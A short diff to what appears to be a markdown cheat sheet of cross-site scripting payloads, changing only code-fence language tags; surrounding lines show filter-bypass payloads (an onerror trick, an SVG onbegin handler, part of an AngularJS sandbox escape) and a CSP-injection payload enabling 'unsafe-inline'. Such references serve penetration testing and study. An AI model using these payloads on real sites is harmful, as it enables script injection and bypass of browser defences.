@@ -181,7 +181,7 @@ onerror=alert; throw,1       // when brackets are encoded and cannot be used.
 ##### `<svg>`
 
 > The `svg` tag allows for other tags inside it, which can be used to craft more complex exploits where some tags are blocked.
-```
+``` HTML
 <svg> <animatetransform onbegin=alert(1)> </svg>
 
 <svg> <a>
@@ -266,7 +266,7 @@ toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constru
 > This can be used to overwrite existing `script-src` elements.
 > Open the console while playing with this to see the results.
 
-```
+``` HTML
 <script>alert(1)</script>&token=;script-src-elem 'unsafe-inline'
 ```
 > Added the `unsafe-inline` directive value that takes any script.
